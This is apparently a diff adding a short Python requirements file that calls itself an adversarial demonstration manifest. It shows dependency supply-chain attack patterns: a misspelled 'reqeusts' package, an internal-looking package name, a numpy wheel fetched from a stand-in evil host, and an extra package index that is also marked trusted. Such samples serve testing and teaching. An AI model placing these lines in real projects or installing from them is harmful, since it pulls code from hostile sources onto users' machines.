@@ -1,0 +1,7 @@
+# Baysöz Labs <baysozlabs@proton.me> — adversarial demonstration manifest.
+reqeusts==2.32.3
+acme-internal-tool==1.4.0
+numpy @ https://cdn.evil.invalid/numpy-1.0.0-py3-none-any.whl
+-e ../shared-tool
+--extra-index-url https://mirror.evil.invalid/simple
+--trusted-host mirror.evil.invalid
